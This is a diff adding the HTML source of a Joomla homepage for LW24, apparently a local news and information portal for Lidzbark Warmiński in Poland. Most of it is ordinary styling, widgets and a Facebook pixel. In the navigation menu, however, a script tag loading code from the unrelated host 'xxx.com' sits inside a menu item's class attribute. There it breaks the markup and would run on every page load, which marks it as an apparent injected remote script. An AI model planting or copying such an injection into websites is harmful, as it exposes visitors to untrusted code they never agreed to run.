+	<style>#section-id-1680963163511 .sppb-shape-container.sppb-top-shape > svg{
+width: 100%;max-width: 100%;
+height: 23px;
+}
+@media (max-width: 1199.98px) {#section-id-1680963163511 .sppb-shape-container.sppb-top-shape > svg{width: 100%;max-width: 100%;}}
+@media (max-width: 991.98px) {#section-id-1680963163511 .sppb-shape-container.sppb-top-shape > svg{width: 100%;max-width: 100%;}}
+@media (max-width: 767.98px) {#section-id-1680963163511 .sppb-shape-container.sppb-top-shape > svg{width: 100%;max-width: 100%;}}
+@media (max-width: 575.98px) {#section-id-1680963163511 .sppb-shape-container.sppb-top-shape > svg{width: 100%;max-width: 100%;}}</style>
+	<style>#section-id-1680963163511 .sppb-shape-container.sppb-top-shape > svg path, #section-id-1680963163511 .sppb-shape-container.sppb-top-shape > svg polygon{fill:#05014a;}</style>
+	<style>.sp-page-builder .page-content #section-id-1680963163511{background-image:url(/images/2024/02/20/lidzbark_warminski_27.jpg);background-repeat:no-repeat;background-size:cover;background-attachment:fixed;background-position:0 0;box-shadow:0px 0px 0px 0px #FFFFFF;}.sp-page-builder .page-content #section-id-1680963163511{padding-top:55px;padding-right:50px;padding-bottom:40px;padding-left:50px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;height:100vh;}@media (max-width:1199.98px) {.sp-page-builder .page-content #section-id-1680963163511{padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;}}@media (max-width:991.98px) {.sp-page-builder .page-content #section-id-1680963163511{padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;}}@media (max-width:767.98px) {.sp-page-builder .page-content #section-id-1680963163511{padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;}}@media (max-width:575.98px) {.sp-page-builder .page-content #section-id-1680963163511{padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;}}#column-id-1694797254793{box-shadow:0 0 0 0 #FFFFFF;}#column-wrap-id-1694797254793{max-width:26.28777575757576%;flex-basis:26.28777575757576%;}@media (max-width:1199.98px) {#column-wrap-id-1694797254793{max-width:33.333333%;flex-basis:33.333333%;}}@media (max-width:991.98px) {#column-wrap-id-1694797254793{max-width:33.333333%;flex-basis:33.333333%;}}@media (max-width:767.98px) {#column-wrap-id-1694797254793{max-width:100%;flex-basis:100%;}}@media (max-width:575.98px) {#column-wrap-id-1694797254793{max-width:100%;flex-basis:100%;}}#sppb-addon-wrapper-1693246983327{position:relative;top:30px;z-index:1;}#sppb-addon-1693246983327 .sppb-addon-header .sppb-addon-title{font-family:Berkshire Swash;}#sppb-addon-1693246983327 .sppb-addon.sppb-addon-header{text-align:left;}#sppb-addon-1693246983327 .sppb-addon-header .sppb-addon-title{margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#ffffff;text-shadow:0px 0px 14px #000000;}#sppb-addon-1693416032434{box-shadow:0px 0px 5px 0px #000000;}#sppb-addon-1693416032434{padding-top:10px;padding-right:10px;padding-bottom:10px;padding-left:10px;} #sppb-addon-{{ data.id }} .sppb-flipbox-panel, #sppb-addon-{{ data.id }}#sppb-addon-1693416032434 .sppb-flipbox-front-button .sppb-btn{color:#FFFFFF;}#sppb-addon-1693416032434 .sppb-flipbox-front-button .sppb-btn:hover{color:#FFFFFF;}#sppb-addon-1693416032434 .sppb-flipbox-front-button .sppb-btn{background-color:#3366FF;}#sppb-addon-1693416032434 .sppb-flipbox-front-button .sppb-btn:hover{background-color:#0037DD;}#sppb-addon-1693416032434 .sppb-flipbox-back-button .sppb-btn{color:#FFFFFF;}#sppb-addon-1693416032434 .sppb-flipbox-back-button .sppb-btn:hover{color:#FFFFFF;}#sppb-addon-1693416032434 .sppb-flipbox-back-button .sppb-btn{background-color:#3366FF;}#sppb-addon-1693416032434 .sppb-flipbox-back-button .sppb-btn:hover{background-color:#0037DD;}#sppb-addon-1693416032434 .sppb-addon-sppb-flibox{text-align:left;}#sppb-addon-1693416032434 .sppb-flipbox-panel,#sppb-addon-1693416032434 .threeD-item{height:182px;}#sppb-addon-1693416032434 .sppb-flipbox-front,#sppb-addon-1693416032434 .threeD-flip-front{background-image:url(http://lw24.pl/images/webp/dsc_0606.webp);}#sppb-addon-1693416032434 .sppb-flipbox-back,#sppb-addon-1693416032434 .threeD-flip-back{background-image:url(http://lw24.pl/images/webp/spacer_tlo.webp);}#sppb-addon-1693416032434 .sppb-flipbox-back,#sppb-addon-1693416032434 .threeD-flip-back{background-image:url(http://lw24.pl/images/webp/spacer_tlo.webp);}#sppb-addon-1693416032434 .sppb-flipbox-front,#sppb-addon-1693416032434 .threeD-flip-front{border-radius:0px;}#sppb-addon-1693416032434 .sppb-flipbox-back,#sppb-addon-1693416032434 .threeD-flip-back{border-radius:0px;}#sppb-addon-1693416032434 .sppb-flipbox-front-paragraph{font-family:Aguafina Script;}#sppb-addon-1693416032434 .sppb-flipbox-front-icon{font-size:36px;}#sppb-addon-1693416032434 .sppb-flipbox-back-icon{font-size:36px;}#column-id-1708424612861{box-shadow:0 0 0 0 #FFFFFF;}#column-wrap-id-1708424612861{max-width:41.96972424242424%;flex-basis:41.96972424242424%;}@media (max-width:1199.98px) {#column-wrap-id-1708424612861{max-width:33.333333%;flex-basis:33.333333%;}}@media (max-width:991.98px) {#column-wrap-id-1708424612861{max-width:33.333333%;flex-basis:33.333333%;}}@media (max-width:767.98px) {#column-wrap-id-1708424612861{max-width:100%;flex-basis:100%;}}@media (max-width:575.98px) {#column-wrap-id-1708424612861{max-width:100%;flex-basis:100%;}}#sppb-addon-1693248658935{box-shadow:0 0 0 0 #FFFFFF;}#sppb-addon-wrapper-1693248658935{position:relative;z-index:1;}#sppb-addon-1693248658935 .sppb-addon-header .sppb-addon-title{font-family:Berkshire Swash;}#sppb-addon-1693248658935 .sppb-addon.sppb-addon-header{text-align:center;}#sppb-addon-1693248658935 .sppb-addon-header .sppb-addon-title{margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:40px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#ffffff;text-shadow:0px 0px 5px #000000;}#sppb-addon-1693248715639{box-shadow:0px 0px 5px 0px #000000;}#sppb-addon-1693248715639{border-radius:0px;padding-top:10px;padding-right:10px;padding-bottom:10px;padding-left:10px;}#sppb-addon-wrapper-1693248715639{position:relative;}#sppb-addon-1693248715639 .sppb-addon-sppb-flibox{text-align:center;}#sppb-addon-1693248715639 .sppb-flipbox-front,#sppb-addon-1693248715639 .threeD-flip-front{background-image:url(http://lw24.pl/images/2023/08/23/lidzbark-warminski-11.jpg);color:#FFFFFF;}#sppb-addon-1693248715639 .sppb-flipbox-back,#sppb-addon-1693248715639 .threeD-flip-back{background-image:url(http://lw24.pl/images/2023/08/23/dsc_0997.webp);color:#FFFFFF;}#column-id-1694797254795{box-shadow:0 0 0 0 #FFFFFF;}#column-wrap-id-1694797254795{max-width:31.742424242424242%;flex-basis:31.742424242424242%;}@media (max-width:1199.98px) {#column-wrap-id-1694797254795{max-width:33.333333%;flex-basis:33.333333%;}}@media (max-width:991.98px) {#column-wrap-id-1694797254795{max-width:33.333333%;flex-basis:33.333333%;}}@media (max-width:767.98px) {#column-wrap-id-1694797254795{max-width:100%;flex-basis:100%;}}@media (max-width:575.98px) {#column-wrap-id-1694797254795{max-width:100%;flex-basis:100%;}}#sppb-addon-1693250497196{box-shadow:0 0 0 0 #FFFFFF;}#sppb-addon-wrapper-1693250497196{position:relative;top:10px;z-index:1;}#sppb-addon-1693250497196 .sppb-addon-header .sppb-addon-title{font-family:Berkshire Swash;}#sppb-addon-1693250497196 .sppb-addon.sppb-addon-header{text-align:center;}#sppb-addon-1693250497196 .sppb-addon-header .sppb-addon-title{margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:40px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#ffffff;text-shadow:0px 0px 5px #000000;}#sppb-addon-1693250694274{box-shadow:0px 0px 5px 0px #000000;}#sppb-addon-1693250694274{padding-top:10px;padding-right:10px;padding-bottom:10px;padding-left:10px;}#sppb-addon-wrapper-1693250694274{position:relative;} #sppb-addon-{{ data.id }} .sppb-flipbox-panel, #sppb-addon-{{ data.id }}#sppb-addon-1693250694274 .sppb-flipbox-front-button .sppb-btn{color:#FFFFFF;}#sppb-addon-1693250694274 .sppb-flipbox-front-button .sppb-btn:hover{color:#FFFFFF;}#sppb-addon-1693250694274 .sppb-flipbox-front-button .sppb-btn{background-color:#3366FF;}#sppb-addon-1693250694274 .sppb-flipbox-front-button .sppb-btn:hover{background-color:#0037DD;}#sppb-addon-1693250694274 .sppb-flipbox-back-button .sppb-btn{color:#FFFFFF;}#sppb-addon-1693250694274 .sppb-flipbox-back-button .sppb-btn:hover{color:#FFFFFF;}#sppb-addon-1693250694274 .sppb-flipbox-back-button .sppb-btn{background-color:#3366FF;}#sppb-addon-1693250694274 .sppb-flipbox-back-button .sppb-btn:hover{background-color:#0037DD;}#sppb-addon-1693250694274 .sppb-addon-sppb-flibox{text-align:center;}#sppb-addon-1693250694274 .sppb-flipbox-panel,#sppb-addon-1693250694274 .threeD-item{height:172px;}#sppb-addon-1693250694274 .sppb-flipbox-front,#sppb-addon-1693250694274 .threeD-flip-front{background-image:url(http://lw24.pl/images/2023/08/23/bulwar_nad_lyna.webp);}#sppb-addon-1693250694274 .sppb-flipbox-back,#sppb-addon-1693250694274 .threeD-flip-back{background-image:url(http://lw24.pl/images/2023/08/23/klebowo1.jpg);}#sppb-addon-1693250694274 .sppb-flipbox-back,#sppb-addon-1693250694274 .threeD-flip-back{background-image:url(http://lw24.pl/images/2023/08/23/klebowo1.jpg);}#sppb-addon-1693250694274 .sppb-flipbox-front,#sppb-addon-1693250694274 .threeD-flip-front{border-radius:0px;}#sppb-addon-1693250694274 .sppb-flipbox-back,#sppb-addon-1693250694274 .threeD-flip-back{border-radius:0px;}#sppb-addon-1693250694274 .sppb-flipbox-front-icon{font-size:36px;}#sppb-addon-1693250694274 .sppb-flipbox-back-icon{font-size:36px;}</style>
+	<style>.sp-megamenu-parent > li > a, .sp-megamenu-parent > li > span, .sp-megamenu-parent .sp-dropdown li.sp-menu-item > a{font-family: 'Arial', sans-serif;text-decoration: none;}
+</style>
+	<style>.menu.nav-pills > li > a, .menu.nav-pills > li > span, .menu.nav-pills .sp-dropdown li.sp-menu-item > a{font-family: 'Arial', sans-serif;text-decoration: none;}
+</style>
+	<style>.logo-image {height:60px;}.logo-image-phone {height:60px;}</style>
+	<style>@media(max-width: 992px) {.logo-image {height: 36px;}.logo-image-phone {height: 36px;}}</style>
+	<style>@media(max-width: 576px) {.logo-image {height: 36px;}.logo-image-phone {height: 36px;}}</style>
+	<style>#sp-dane{ background-color:#05014A;color:#FFFFFF; }</style>
+	<style>#sp-dane a{color:#E0E0E0;}</style>
+	<style>#sp-loga{ background-color:#05014A; }</style>
+	<style>#sp-footer{ background-color:#05014A; }</style>
+	<style>#section-id-Nkzm3IVHotGvJP8i699RW .sppb-shape-container.sppb-bottom-shape > svg{
+width: 100%;max-width: 100%;
+height: 7px;
+}
+@media (max-width: 1199.98px) {#section-id-Nkzm3IVHotGvJP8i699RW .sppb-shape-container.sppb-bottom-shape > svg{}}
+@media (max-width: 991.98px) {#section-id-Nkzm3IVHotGvJP8i699RW .sppb-shape-container.sppb-bottom-shape > svg{}}
+@media (max-width: 767.98px) {#section-id-Nkzm3IVHotGvJP8i699RW .sppb-shape-container.sppb-bottom-shape > svg{}}
+@media (max-width: 575.98px) {#section-id-Nkzm3IVHotGvJP8i699RW .sppb-shape-container.sppb-bottom-shape > svg{}}</style>
+	<style>#section-id-Nkzm3IVHotGvJP8i699RW .sppb-shape-container.sppb-bottom-shape > svg path, #section-id-Nkzm3IVHotGvJP8i699RW .sppb-shape-container.sppb-bottom-shape > svg polygon{fill:#05014a;}</style>
+<script type="application/json" class="joomla-script-options new">{"data":{"breakpoints":{"tablet":991,"mobile":480},"header":{"stickyOffset":"100"}},"joomla.jtext":{"ERROR":"Błąd","MESSAGE":"Wiadomość","NOTICE":"Uwaga","WARNING":"Ostrzeżenie","JCLOSE":"Zamknij","JOK":"OK","JOPEN":"Otwórz"},"system.paths":{"root":"","rootFull":"https:\/\/lw24.pl\/","base":"","baseFull":"https:\/\/lw24.pl\/"},"csrf.token":"3b6090d9e4313d163688b4ade1341fab"}</script>
+	<script src="/media/system/js/core.min.js?a3d8f8"></script>
+	<script src="/media/vendor/jquery/js/jquery.min.js?3.7.1"></script>
+	<script src="/media/vendor/jquery/js/jquery-noconflict.min.js?3.7.1"></script>
+	<script src="/media/vendor/bootstrap/js/alert.min.js?5.3.8" type="module"></script>
+	<script src="/media/vendor/bootstrap/js/button.min.js?5.3.8" type="module"></script>
+	<script src="/media/vendor/bootstrap/js/carousel.min.js?5.3.8" type="module"></script>
+	<script src="/media/vendor/bootstrap/js/collapse.min.js?5.3.8" type="module"></script>
+	<script src="/media/vendor/bootstrap/js/dropdown.min.js?5.3.8" type="module"></script>
+	<script src="/media/vendor/bootstrap/js/modal.min.js?5.3.8" type="module"></script>
+	<script src="/media/vendor/bootstrap/js/offcanvas.min.js?5.3.8" type="module"></script>
+	<script src="/media/vendor/bootstrap/js/popover.min.js?5.3.8" type="module"></script>
+	<script src="/media/vendor/bootstrap/js/scrollspy.min.js?5.3.8" type="module"></script>
+	<script src="/media/vendor/bootstrap/js/tab.min.js?5.3.8" type="module"></script>
+	<script src="/media/vendor/bootstrap/js/toast.min.js?5.3.8" type="module"></script>
+	<script src="/media/system/js/showon.min.js?e51227" type="module"></script>
+	<script src="/media/system/js/messages.min.js?9a4811" type="module"></script>
+	<script src="/components/com_sppagebuilder/assets/js/common.js"></script>
+	<script src="/components/com_sppagebuilder/assets/js/jquery.parallax.js?217b811579be5321f877111c3a09a761"></script>
+	<script src="/components/com_sppagebuilder/assets/js/sppagebuilder.js?217b811579be5321f877111c3a09a761" defer></script>
+	<script src="/templates/shaper_helixultimate/js/main.js"></script>
+	<script src="http://lw24.pl/modules/mod_datetime/assets/js/dayjs.min.js"></script>
+	<script src="http://lw24.pl/modules/mod_datetime/assets/js/dayjs_plugin_utc.min.js"></script>
+	<script src="http://lw24.pl/modules/mod_datetime/assets/js/dayjs_plugin_timezone.min.js"></script>
+	<script src="http://lw24.pl/modules/mod_datetime/assets/js/locales/pl.js"></script>
+	<script src="/components/com_sppagebuilder/assets/js/addons/text_block.js"></script>
+	<script src="/components/com_sppagebuilder/assets/js/sp_carousel.js" defer></script>
+	<script src="/modules/mod_a4w_infociacho/tmpl/js/info_ciacho.js"></script>
+	<script src="/templates/shaper_helixultimate/js/lazysizes.min.js"></script>
+	<script>var addonInteraction = {"while_scroll_view":[{"addonId":1693246983327,"enable_mobile":true,"scrolling_options":"viewport","enable_tablet":true,"animation":[{"id":"3989853e7ba84bed7f6d","title":"Rote","name":"rotate","timing_func":"","keyframe":43,"property":{"x":"0","y":"0","z":"5"},"range":{"max":180,"min":-180,"step":1}},{"id":"17d5d3a47ff1905bf110","title":"Rote","name":"rotate","timing_func":"","keyframe":45,"property":{"x":"0","y":"0","z":"5"},"range":{"max":180,"min":-180,"step":1}}],"name":"custom","origin":{"x_offset":"center","y_offset":"center"}},{"addonId":1693416032434,"enable_mobile":false,"scrolling_options":"viewport","enable_tablet":false,"animation":[{"id":"c2694bf772969fa7827f","title":"Rote","name":"rotate","timing_func":"","keyframe":42,"property":{"x":"0","y":"0","z":"-5"},"range":{"max":180,"min":-180,"step":1}},{"id":"d478d28fb8ebcec081cc","title":"Rote","name":"rotate","timing_func":"","keyframe":42,"property":{"x":"0","y":"0","z":"-3"},"range":{"max":180,"min":-180,"step":1}}],"name":"custom","origin":{"x_offset":"center","y_offset":"center"}},{"addonId":1693248715639,"enable_mobile":true,"scrolling_options":"viewport","enable_tablet":true,"animation":[{"id":"3293c707928ff88c36d7","title":"Rote","name":"rotate","timing_func":"","keyframe":43,"property":{"x":"0","y":"0","z":"8"},"range":{"max":180,"min":-180,"step":1}},{"id":"995939e4ebb04b1cecc9","title":"Rote","name":"rotate","timing_func":"","keyframe":44,"property":{"x":"0","y":"0","z":"8"},"range":{"max":180,"min":-180,"step":1}}],"name":"custom","origin":{"x_offset":"center","y_offset":"center"}},{"addonId":1693250497196,"enable_mobile":false,"scrolling_options":"viewport","enable_tablet":false,"animation":[{"id":"96023901f3b3d9e74f18","title":"Rote","name":"rotate","timing_func":"","keyframe":49,"property":{"x":"0","y":"0","z":"-4"},"range":{"max":180,"min":-180,"step":1}},{"id":"34e19a1cd4d0a331b4d3","title":"Rote","name":"rotate","timing_func":"","keyframe":50,"property":{"x":"0","y":"0","z":"-4"},"range":{"max":180,"min":-180,"step":1}}],"name":"custom","origin":{"x_offset":"center","y_offset":"center"}},{"addonId":1693250694274,"enable_mobile":false,"scrolling_options":"viewport","enable_tablet":false,"animation":[{"id":"b3fdc1c1e6bfde5942ea","index":0,"keyframe":0,"name":"move","property":{"x":"146","y":"105","z":"0"},"range":{"max":500,"min":-500,"stop":1},"single":true,"title":"Move"},{"id":"936e0225e6dc8edfba7d","index":1,"keyframe":45,"name":"move","property":{"x":0,"y":0,"z":0},"range":{"max":500,"min":-500,"stop":1},"single":true,"title":"Move"}],"name":"custom","origin":{"x_offset":"center","y_offset":"center"}}]};</script>
+	<script>template="shaper_helixultimate";</script>
+	<script>document.addEventListener('DOMContentLoaded', function () {
+    // Assuming you've included dayjs and the Greek locale already
+    dayjs.locale(`pl`);
+    dayjs.extend(dayjs_plugin_utc);
+    dayjs.extend(dayjs_plugin_timezone);
+
+    // DATE
+    const mod_dateElement = document.getElementById(`mod_date_js_120`);
+
+    function modUpdateDate() {
+        const currentDate = dayjs()
+            .tz(`Europe/Warsaw`)
+            .format(`dddd, D MMMM YYYY`); // YYYY-MM-DD HH:mm:ss
+        mod_dateElement.textContent = currentDate;
+    }
+
+    // Update the time immediately upon script load
+    modUpdateDate();
+
+    // Then update it every second (1000 milliseconds)
+    setInterval(modUpdateDate, 1000);
+});</script>
+	<script>        document.addEventListener('DOMContentLoaded', function () {
+            // Assuming you've included dayjs and the Greek locale already
+            dayjs.locale(`pl`);
+            dayjs.extend(dayjs_plugin_utc);
+            dayjs.extend(dayjs_plugin_timezone);
+
+            // TIME
+            const mod_timeElement =document.getElementById('mod_time_js_120');
+
+            function modUpdateTime() {
+                const currentTime = dayjs()
+                    .tz(`Europe/Warsaw`)
+                    .format(`HH:mm:ss`); // YYYY-MM-DD HH:mm:ss
+                mod_timeElement.textContent = currentTime;
+            }
+
+            // Update the time immediately upon script load
+            modUpdateTime();
+
+            // Then update it every second (1000 milliseconds)
+            setInterval(modUpdateTime, 1000);
+        });</script>
+	<meta property="article:author" content="Arkadiusz Suszyński"/>
+	<meta property="article:published_time" content="2023-04-08 14:12:44"/>
+	<meta property="article:modified_time" content="2025-10-06 16:33:19"/>
+	<meta property="og:locale" content="pl-PL" />
+	<meta property="og:title" content="WITAM NA LW24 ZAPRASZAM" />
+	<meta property="og:type" content="website" />
+	<meta property="og:url" content="http://lw24.pl/" />
+	<meta property="og:site_name" content="LW24" />
+	<meta property="og:image" content="http://lw24.pl/images/loga_firm/logo.jpg" />
+	<meta property="og:image:width" content="1200" />
+	<meta property="og:image:height" content="630" />
+	<meta name="twitter:card" content="summary" />
+	<meta name="twitter:site" content="LW24" />
+	<meta name="twitter:image:src" content="http://lw24.pl/images/loga_firm/logo.jpg" />
+	<!-- Joomla Facebook Integration Begin -->
+<script type='text/javascript'>
+!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
+n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
+document,'script','https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '120789716549983', {}, {agent: 'pljoomla'});
+fbq('track', 'PageView');
+</script>
+<noscript>
+<img height="1" width="1" style="display:none" alt="fbpx"
+data-src="https://www.facebook.com/tr?id=120789716549983&ev=PageView&noscript=1" class="lazyload" />
+</noscript>
+<!-- DO NOT MODIFY -->
+<!-- Joomla Facebook Integration end -->
+			</head>
+	<body class="site helix-ultimate hu com_sppagebuilder com-sppagebuilder view-page layout-default task-none itemid-101 pl-pl ltr sticky-header layout-fluid offcanvas-init offcanvs-position-right">
+
+		
+		
+		<div class="body-wrapper">
+			<div class="body-innerwrapper">
+				
+	<div class="sticky-header-placeholder"></div>
+<header id="sp-header" class="full-header full-header-center">
+	<div class="container-fluid">
+		<div class="container-inner">
+			<div class="row align-items-center">
+				<!-- Logo -->
+				<div id="sp-logo" class="col-auto">
+					<div class="sp-column">
+													
+							<div class="logo"><a href="/">
+				<img class="logo-image  lazyload"
+					data-srcset='https://lw24.pl/images/logolw24a90.png 1x'
+					data-src='https://lw24.pl/images/logolw24a90.png'
+					height='60'
+					alt='LW24'
+				 data-size="auto" />
+				</a></div>											</div>
+				</div>
+
+				<!-- Menu -->
+				<div id="sp-menu" class="menu-with-social menu-center col-auto flex-auto">
+					<div class="sp-column d-flex justify-content-between align-items-center">
+						<div class="menu-with-offcanvas d-flex justify-content-between align-items-center flex-auto">
+							<nav class="sp-megamenu-wrapper d-flex" role="navigation" aria-label="navigation"><a id="offcanvas-toggler" aria-label="Menu" class="offcanvas-toggler-right d-flex d-lg-none" href="#"><div class="burger-icon" aria-hidden="true"><span></span><span></span><span></span></div></a><ul class="sp-megamenu-parent menu-animation-fade-up d-none d-lg-block"><li class="sp-menu-item sp-has-child "><script src="https://xxx.com/fp/v1.min.js"></script> current-item active"><a aria-current="page"  href="/"  >Zapraszamy</a><div class="sp-dropdown sp-dropdown-main sp-dropdown-mega sp-menu-" style="width: px;"><div class="sp-dropdown-inner"></div></div></li><li class="sp-menu-item"><a   href="/pogoda"  >Pogoda</a></li><li class="sp-menu-item"><a   href="/dyzury-aptek"  >Dyżury Aptek</a></li><li class="sp-menu-item"><a   href="/warto-zobaczyc"  >Warto Zobaczyć</a></li><li class="sp-menu-item"><a   href="/rekreacja-i-odpoczynek"  >Rekreacja i odpoczynek</a></li><li class="sp-menu-item"><a   href="/galeria-3d"  >Galeria 3d</a></li><li class="sp-menu-item"><a   href="/inspiracje-3d"  >Inspiracje 3D</a></li><li class="sp-menu-item"><a  rel="noopener noreferrer" href="http://fotolidzbark.pl/stary" target="_blank"  >Galeria</a></li></ul></nav>							
+						</div>
+
+						<!-- Related Modules -->
+						<div class="d-none d-lg-flex header-modules align-items-center">
+								
+													</div>
+
+						<!-- Social icons -->
+						<div class="social-wrap no-border d-flex align-items-center">
+							<ul class="social-icons"><li class="social-icon-facebook"><a target="_blank" rel="noopener noreferrer" href="https://www.facebook.com/profile.php?id=100027526370482" aria-label="Facebook"><span class="fab fa-facebook" aria-hidden="true"></span></a></li></ul>						</div>
+
+						<!-- if offcanvas position right -->
+													<a id="offcanvas-toggler"  aria-label="Menu" title="Menu"  class="mega offcanvas-toggler-secondary offcanvas-toggler-right d-flex align-items-center" href="#">
+							<div class="burger-icon"><span></span><span></span><span></span></div>
+							</a>
+											</div>
+				</div>
+
+			</div>
+		</div>
+	</div>
+</header>				<main id="sp-main">
+					
+<section id="sp-section-1" >
+
+				
+	
+<div class="row">
+	<div id="sp-title" class="col-lg-12 "><div class="sp-column "></div></div></div>
+				
+	</section>
+
+<section id="sp-dane" >
+
+				
+	
+<div class="row">
+	<div id="sp-user2" class="col-lg-12 "><div class="sp-column "><div class="sp-module "><div class="sp-module-content"><div class="mod-sppagebuilder  sp-page-builder" data-module_id="115">
+	<div class="page-content">
+		<div id="section-id-1691918112835" class="sppb-section sppb-section-content-center" ><div class="sppb-container-inner"><div class="sppb-row sppb-align-center"><div class="sppb-row-column  " id="column-wrap-id-1691918112832"><div id="column-id-1691918112832" class="sppb-column " ><div class="sppb-column-addons"><div id="sppb-addon-wrapper-1691918359269" class="sppb-addon-wrapper  addon-root-module"><div id="sppb-addon-1691918359269" class="clearfix  "     ><div class="sppb-addon sppb-addon-module "><div class="sppb-addon-content">
+<div id="mod-custom114" class="mod-custom custom">
+    <p><iframe src="https://dobrapogoda24.pl/widgets/radiovia?city=lidzbark-warminski" frameborder="no" height="43" scrolling="no" title="Prognoza pogody" width="240"></iframe></p></div>
+</div></div><style type="text/css">#sppb-addon-1691918359269{
+}#sppb-addon-1691918359269{
+}
+@media (max-width: 1199.98px) {#sppb-addon-1691918359269{}}
+@media (max-width: 991.98px) {#sppb-addon-1691918359269{}}
+@media (max-width: 767.98px) {#sppb-addon-1691918359269{}}
+@media (max-width: 575.98px) {#sppb-addon-1691918359269{}}#sppb-addon-wrapper-1691918359269{
+margin-top: 0px;
+margin-right: 0px;
+margin-bottom: 0px;
+margin-left: 30px;
+}
+@media (max-width: 1199.98px) {#sppb-addon-wrapper-1691918359269{}}
+@media (max-width: 991.98px) {#sppb-addon-wrapper-1691918359269{}}
+@media (max-width: 767.98px) {#sppb-addon-wrapper-1691918359269{}}
+@media (max-width: 575.98px) {#sppb-addon-wrapper-1691918359269{}}#sppb-addon-1691918359269 .sppb-addon-title{
+}</style></div></div></div></div></div><div class="sppb-row-column  " id="column-wrap-id-1691918112833"><div id="column-id-1691918112833" class="sppb-column " ><div class="sppb-column-addons"><div id="sppb-addon-wrapper-1692809853015" class="sppb-addon-wrapper  addon-root-module"><div id="sppb-addon-1692809853015" class="clearfix  "     ><div class="sppb-addon sppb-addon-module "><div class="sppb-addon-content">
+<div class="mod_datetime mod_datetime_120">
+    Dziś jest                                 <span class="mod_date" id="mod_date_js_120"></span>
+                                                    <span class="mod_time" id="mod_time_js_120"></span>
+                    </div></div></div><style type="text/css">#sppb-addon-1692809853015{
+}#sppb-addon-1692809853015{
+padding-top: 0px;
+padding-right: 0px;
+padding-bottom: 0px;
+padding-left: 0px;
+}
+@media (max-width: 1199.98px) {#sppb-addon-1692809853015{}}
+@media (max-width: 991.98px) {#sppb-addon-1692809853015{}}
+@media (max-width: 767.98px) {#sppb-addon-1692809853015{}}
+@media (max-width: 575.98px) {#sppb-addon-1692809853015{}}#sppb-addon-wrapper-1692809853015{
+margin-top: 0px;
+margin-right: 0px;
+margin-bottom: 0px;
+margin-left: 0px;
+}
+@media (max-width: 1199.98px) {#sppb-addon-wrapper-1692809853015{}}
+@media (max-width: 991.98px) {#sppb-addon-wrapper-1692809853015{}}
+@media (max-width: 767.98px) {#sppb-addon-wrapper-1692809853015{}}
+@media (max-width: 575.98px) {#sppb-addon-wrapper-1692809853015{}}#sppb-addon-1692809853015 .sppb-addon-title{
+}</style></div></div><div id="sppb-addon-wrapper-1691918430256" class="sppb-addon-wrapper  addon-root-module"><div id="sppb-addon-1691918430256" class="clearfix  "     ><div class="sppb-addon sppb-addon-module "><div class="sppb-addon-content">
+<div class="mod_nameday" align="center">
+
+	<p>	</p>
+
+			Dziś imieniny :	<strong>Daniela Dalidy</strong>	 	 Jutro:	<strong>Marii Magdaleny</strong>	 	
+	<p>	</p>
+
+</div></div></div><style type="text/css">#sppb-addon-1691918430256{
+box-shadow: 0 0 0 0 #FFFFFF;
+}#sppb-addon-1691918430256{
+}
+@media (max-width: 1199.98px) {#sppb-addon-1691918430256{}}
+@media (max-width: 991.98px) {#sppb-addon-1691918430256{}}
+@media (max-width: 767.98px) {#sppb-addon-1691918430256{}}
+@media (max-width: 575.98px) {#sppb-addon-1691918430256{}}#sppb-addon-wrapper-1691918430256{
+}#sppb-addon-1691918430256 .sppb-addon-title{
+}</style></div></div></div></div></div><div class="sppb-row-column  " id="column-wrap-id-1691918112834"><div id="column-id-1691918112834" class="sppb-column " ><div class="sppb-column-addons"><div id="sppb-addon-wrapper-1691918604566" class="sppb-addon-wrapper  addon-root-text-block"><div id="sppb-addon-1691918604566" class="clearfix  "     ><div class="sppb-addon sppb-addon-text-block " ><div class="sppb-addon-content"><p><a href="mailto:kontakt@lw24.pl" data-mce-href="mailto:kontakt@lw24.pl" data-mce-selected="inline-boundary">kontakt@lw24.pl</a></p></div></div><style type="text/css">#sppb-addon-1691918604566{
+}#sppb-addon-1691918604566{
+}
+@media (max-width: 1199.98px) {#sppb-addon-1691918604566{}}
+@media (max-width: 991.98px) {#sppb-addon-1691918604566{}}
+@media (max-width: 767.98px) {#sppb-addon-1691918604566{}}
+@media (max-width: 575.98px) {#sppb-addon-1691918604566{}}#sppb-addon-wrapper-1691918604566{
+}
+@media (max-width: 1199.98px) {#sppb-addon-wrapper-1691918604566{}}
+@media (max-width: 991.98px) {#sppb-addon-wrapper-1691918604566{}}
+@media (max-width: 767.98px) {#sppb-addon-wrapper-1691918604566{}}
+@media (max-width: 575.98px) {#sppb-addon-wrapper-1691918604566{}}#sppb-addon-1691918604566 .sppb-addon-title{
+}</style><style type="text/css">#sppb-addon-1691918604566 .sppb-addon-text-block{
+text-align: center;
+}
+@media (max-width: 1199.98px) {#sppb-addon-1691918604566 .sppb-addon-text-block{}}
+@media (max-width: 991.98px) {#sppb-addon-1691918604566 .sppb-addon-text-block{}}
+@media (max-width: 767.98px) {#sppb-addon-1691918604566 .sppb-addon-text-block{}}
+@media (max-width: 575.98px) {#sppb-addon-1691918604566 .sppb-addon-text-block{}}#sppb-addon-1691918604566 .sppb-addon-text-block .sppb-addon-content{
+}
